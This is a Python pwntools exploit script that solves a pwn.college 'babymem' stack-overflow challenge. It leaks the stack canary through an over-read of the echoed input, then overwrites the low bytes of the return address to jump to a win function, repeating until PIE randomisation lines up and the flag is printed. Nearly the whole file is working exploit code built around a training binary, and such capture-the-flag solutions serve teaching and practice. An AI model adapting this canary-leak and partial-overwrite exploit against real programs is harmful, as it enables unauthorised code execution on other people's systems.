#!usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF('/challenge/babymem_level14.0')

# Set the first two bytes to use in the return address
win_addr = b"\x1d\x16"

# Compute the distance from the buffer to the canary on the stack
buffer_offset = 0x118
canary_offset = 0x10
canary_distance = buffer_offset - canary_offset

# NOTE: because the binary uses PIE (Positional Independent Execution) we have to
#       try multiple times until the win_authed function will be loaded in our guessed
#       address.
#       This can be done because the addresses are aligned 0x1000, then the first 3 nibbles
#       are fixed and the 4th changes at every time execution.
while (True):
    # Run the program
    io = elf.process()

    # Send the size of the first payload to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(b'105')

    # Build and send the payload to the program
    PAYLOAD = b'REPEAT' + b'A'*(104 - 6) + b'A'
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the canary by reading the output and selecting the correct bytes
    io.recvuntil(b'You said: ')
    canary = b'\x00' + io.recvline()[105:112]

    io.recvuntil(b'Payload size: ')
    io.sendline(f"{buffer_offset + 2}".encode())

    PAYLOAD = b'A'*(canary_distance) + canary + b'A'*8 + win_addr
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b'Goodbye!')
    flag = io.recvall().decode()

    # Check if the flag has been retrieved correctly
    if "pwn.college" in flag:
        print(flag)
        break